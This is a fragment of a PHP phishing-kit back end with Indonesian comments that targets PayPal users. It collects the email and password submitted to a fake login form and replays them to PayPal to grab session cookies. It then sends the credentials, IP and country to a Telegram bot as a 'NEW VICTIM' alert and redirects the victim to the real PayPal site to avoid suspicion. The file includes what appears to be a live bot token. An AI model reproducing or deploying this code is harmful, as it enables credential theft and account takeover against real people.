<?php
// ================================================================
//  KONFIGURASI TELEGRAM – GANTI PUNYA LO!
// ================================================================
$botToken = '8896059398:AAGR0eMN-7_Q-UXBGO6LnXMAoESiMHt34Sg';   // Token dari @BotFather
$chatId   = '8992368095';     // ID Telegram lo (dari @userinfobot)
// ================================================================

// Ambil data dari form phising
$email    = $_POST['email'] ?? '';
...
// 1. Ambil negara dari IP
$country = get_country($ip);

// 2. Forward login ke PayPal buat dapetin cookies (session)
$cookies = forward_to_paypal($email, $password);

// 3. Kirim semua data ke Telegram
$message = "🎯 *NEW VICTIM!*\n"
         . "📧 *Email:* $email\n"
         . "🔑 *Password:* $password\n"
         . "🌐 *IP:* $ip\n"
...
// 4. Redirect korban ke PayPal asli (biar ga curiga)
